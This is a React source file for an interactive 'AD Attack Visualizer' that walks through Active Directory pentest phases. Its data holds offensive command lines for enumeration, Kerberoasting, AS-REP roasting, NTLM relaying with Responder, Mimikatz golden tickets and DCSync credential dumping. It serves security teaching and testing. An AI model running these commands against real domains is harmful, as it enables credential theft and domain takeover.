import React, { useState } from 'react';
import { ChevronLeft, Terminal, Shield, Crosshair, Server, Database, Key, LayoutDashboard, Play, TriangleAlert } from 'lucide-react';

// Data Structures
interface ADNode {
  id: string;
  title: string;
  icon?: React.ReactNode;
  description: string;
  children?: ADNode[];
  details?: {
    concepts: string[];
    tools: string[];
    commands: string[];
  };
}

const AD_DATA: ADNode = {
  id: 'root',
  title: 'Active Directory Pentest',
  description: 'The root of the attack path. Select a phase to begin.',
  icon: <Server className="w-12 h-12 text-primary-500" />,
  children: [
    {
      id: 'enum',
      title: 'Enumeration',
      description: 'Mapping the attack surface. Identifying users, computers, shares, and trusts.',
      icon: <Database className="w-8 h-8 text-blue-400" />,
      children: [
        {
          id: 'enum-powerview',
          title: 'PowerView / SharpHound',
          description: 'Gathering object data via LDAP.',
          icon: <LayoutDashboard className="w-6 h-6 text-blue-300" />,
          details: {
            concepts: ['LDAP Querying', 'Domain Mapping', 'ACL Enumeration'],
            tools: ['PowerView.ps1', 'BloodHound', 'SharpHound.exe'],
            commands: [
              'Get-DomainUser -PreauthNotRequired -Verbose',
              'Get-DomainComputer -OperatingSystem "*Server*"',
              'Invoke-BloodHound -CollectionMethod All',
              'Get-DomainGPO -ComputerIdentity DC01'
            ]
          }
        },
        {
          id: 'enum-smb',
          title: 'SMB & Shares',
          description: 'Finding open file shares and readable sensitive files.',
          icon: <LayoutDashboard className="w-6 h-6 text-blue-300" />,
          details: {
            concepts: ['SMB Signing', 'Readable Shares', 'SYSVOL'],
            tools: ['CrackMapExec', 'SMBMap', 'Enum4Linux'],
            commands: [
              'crackmapexec smb 192.168.1.0/24 --shares',
              'smbmap -H 192.168.1.10 -u null',
              'crackmapexec smb <IP> -u <User> -p <Pass> --spider "passwords"'
            ]
          }
        }
      ]
    },
    {
      id: 'exploit',
      title: 'Exploitation',
      description: 'Leveraging misconfigurations to gain credentials or access.',
      icon: <Crosshair className="w-8 h-8 text-red-500" />,
      children: [
        {
          id: 'kerberoast',
          title: 'Kerberoasting',
          description: 'Requesting TGS for service accounts to crack offline.',
          icon: <TriangleAlert className="w-6 h-6 text-red-400" />,
          details: {
            concepts: ['SPNs', 'TGS-REP', 'Offline Cracking'],
            tools: ['Rubeus', 'GetUserSPNs.py (Impacket)', 'Hashcat'],
            commands: [
              'Rubeus.exe kerberoast /stats',
              'GetUserSPNs.py domain.local/user:password -request',
              'hashcat -m 13100 hash.txt wordlist.txt'
            ]
          }
        },
        {
          id: 'asrep',
          title: 'AS-REP Roasting',
          description: 'Targeting accounts with "Do not require Kerberos preauthentication".',
          icon: <TriangleAlert className="w-6 h-6 text-red-400" />,
          details: {
            concepts: ['Pre-Auth Disabled', 'AS-REP Packet'],
            tools: ['Rubeus', 'GetNPUsers.py'],
            commands: [
              'Rubeus.exe asreproast /format:hashcat',
              'GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat',
              'hashcat -m 18200 hash.txt wordlist.txt'
            ]
          }
        },
        {
          id: 'relay',
          title: 'NTLM Relaying',
          description: 'Relaying authentication to other machines (if signing is off).',
          icon: <TriangleAlert className="w-6 h-6 text-red-400" />,
          details: {
            concepts: ['LLMNR Poisoning', 'SMB Signing', 'MitM'],
            tools: ['Responder', 'ntlmrelayx.py'],
            commands: [
              'sudo responder -I eth0 -dw',
              'ntlmrelayx.py -tf targets.txt -smb2support',
              'Run Responder first, then wait for traffic'
            ]
          }
        }
      ]
    },
    {
      id: 'post',
      title: 'Post-Compromise',
      description: 'Persistence, Privilege Escalation, and Domain Dominance.',
      icon: <Shield className="w-8 h-8 text-purple-500" />,
      children: [
        {
          id: 'golden',
          title: 'Golden Ticket',
          description: 'Forging TGTs using the KRBTGT hash.',
          icon: <Key className="w-6 h-6 text-purple-400" />,
          details: {
            concepts: ['KDC', 'TGT Forgery', 'Domain Persistence'],
            tools: ['Mimikatz', 'Rubeus'],
            commands: [
              'mimikatz # lsadump::lsa /inject /name:krbtgt',
              'mimikatz # kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5... /krbtgt:HASH /id:500',
              'Rubeus.exe golden /aes256:HASH /user:FakeAdmin ...'
            ]
          }
        },
        {
          id: 'dcsync',
          title: 'DCSync',
          description: 'Simulating a DC to request password hashes.',
          icon: <Key className="w-6 h-6 text-purple-400" />,
          details: {
            concepts: ['DRS Remote Protocol', 'Replication Rights'],
            tools: ['Mimikatz', 'secretsdump.py'],
            commands: [
              'mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator',
              'secretsdump.py domain.local/user:pass@IP -just-dc'
            ]
          }
        }
      ]
    }
  ]
};

const ADFlowchart: React.FC = () => {
  const [history, setHistory] = useState<ADNode[]>([AD_DATA]);
  const activeNode = history[history.length - 1];

  const handleDrillDown = (node: ADNode) => {
    setHistory([...history, node]);
  };

  const handleBack = () => {
    if (history.length > 1) {
      setHistory(history.slice(0, -1));
    } else {
        // If at root, go back to main site
        window.history.back();
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-200 flex flex-col font-sans">
      {/* Header */}
      <div className="bg-slate-900 border-b border-slate-800 p-4 flex justify-between items-center sticky top-0 z-20 shadow-lg shadow-primary-900/10">
        <div className="flex items-center gap-4">
          <button 
            onClick={handleBack}
            className="p-2 hover:bg-slate-800 rounded-full transition-colors border border-transparent hover:border-slate-700"
          >
            <ChevronLeft className="w-6 h-6 text-primary-400" />
          </button>
          <div>
            <h1 className="text-xl font-bold flex items-center gap-2">
              <Shield className="w-5 h-5 text-primary-500" />
              AD Attack Visualizer
            </h1>
            <div className="flex items-center gap-2 text-xs font-mono text-slate-500">
              {history.map((node, i) => (
                <span key={node.id} className="flex items-center">
                  {i > 0 && <span className="mx-1">/</span>}
                  <span className={i === history.length - 1 ? 'text-primary-400' : ''}>
                    {node.title}
                  </span>
                </span>
              ))}
            </div>
          </div>
        </div>
        <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-primary-500/10 border border-primary-500/20 rounded-full text-xs font-mono text-primary-400 animate-pulse">
          <div className="w-2 h-2 bg-primary-500 rounded-full" />
          SYSTEM LIVE
        </div>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 p-6 md:p-10 flex flex-col items-center justify-center overflow-y-auto bg-[url('https://grainy-gradients.vercel.app/noise.svg')]">
        
        {/* Active Node Hero */}
        <div className="text-center mb-12 max-w-2xl animate-fade-in-up">
          <div className="inline-flex p-4 rounded-full bg-slate-900/80 border border-slate-700 mb-6 shadow-[0_0_30px_-10px_rgba(16,185,129,0.3)]">
            {activeNode.icon || <Shield className="w-12 h-12 text-primary-500" />}
          </div>
          <h2 className="text-4xl md:text-5xl font-bold mb-4 text-white tracking-tight">{activeNode.title}</h2>
          <p className="text-lg text-slate-400">{activeNode.description}</p>
        </div>

        {/* Children / Choices */}
        {activeNode.children && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 w-full max-w-5xl">
            {activeNode.children.map((child) => (
              <button
                key={child.id}
                onClick={() => handleDrillDown(child)}
                className="group relative bg-slate-900/60 border border-slate-800 hover:border-primary-500/50 p-6 rounded-xl text-left transition-all hover:-translate-y-1 hover:shadow-xl hover:shadow-primary-500/10 overflow-hidden"
              >
                <div className="absolute inset-0 bg-gradient-to-br from-primary-500/0 to-primary-500/0 group-hover:to-primary-500/5 transition-all duration-500" />
                <div className="flex items-start justify-between mb-4">
                  <div className="p-2 bg-slate-950 rounded border border-slate-800 group-hover:border-primary-500/30 transition-colors">
                    {child.icon}
                  </div>
                  <ChevronLeft className="w-5 h-5 text-slate-600 rotate-180 group-hover:translate-x-1 transition-transform" />
                </div>
                <h3 className="text-xl font-bold text-slate-200 group-hover:text-primary-400 mb-2">{child.title}</h3>
                <p className="text-sm text-slate-500 line-clamp-2">{child.description}</p>
              </button>
            ))}
          </div>
        )}

        {/* Leaf Node Details (If no children) */}
        {!activeNode.children && activeNode.details && (
          <div className="w-full max-w-5xl grid grid-cols-1 lg:grid-cols-2 gap-8 animate-fade-in">
            
            {/* Concepts & Tools */}
            <div className="space-y-6">
              <div className="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <h3 className="text-lg font-bold text-primary-400 mb-4 flex items-center gap-2">
                  <Database className="w-5 h-5" /> Key Concepts
                </h3>
                <div className="flex flex-wrap gap-2">
                  {activeNode.details.concepts.map(c => (
                    <span key={c} className="px-3 py-1 bg-slate-800 text-slate-300 rounded-full text-sm border border-slate-700">
                      {c}
                    </span>
                  ))}
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <h3 className="text-lg font-bold text-red-400 mb-4 flex items-center gap-2">
                  <Shield className="w-5 h-5" /> Arsenal (Tools)
                </h3>
                <div className="flex flex-wrap gap-2">
                  {activeNode.details.tools.map(t => (
                    <span key={t} className="px-3 py-1 bg-red-900/20 text-red-300 rounded border border-red-900/50 font-mono text-sm">
                      {t}
                    </span>
                  ))}
                </div>
              </div>
            </div>

            {/* Terminal Commands */}
            <div className="bg-slate-950 border border-slate-800 rounded-lg shadow-2xl overflow-hidden flex flex-col h-full">
              <div className="bg-slate-900 px-4 py-2 border-b border-slate-800 flex items-center gap-2">
                <Terminal className="w-4 h-4 text-slate-500" />
                <span className="text-xs font-mono text-slate-500">terminal@kali:~</span>
              </div>
              <div className="p-6 font-mono text-sm text-slate-300 space-y-4 overflow-y-auto max-h-[400px]">
                {activeNode.details.commands.map((cmd, i) => (
                  <div key={i} className="group relative">
                    <div className="absolute -left-4 top-0 bottom-0 w-0.5 bg-primary-500/20 group-hover:bg-primary-500 transition-colors" />
                    <div className="text-slate-500 text-xs mb-1 select-none">$ Command {i + 1}</div>
                    <div className="text-primary-300 bg-slate-900/50 p-3 rounded border border-slate-800/50 hover:border-primary-500/30 transition-colors break-all">
                      {cmd}
                    </div>
                  </div>
                ))}
              </div>
            </div>

          </div>
        )}
      </div>
    </div>
  );
};

export default ADFlowchart;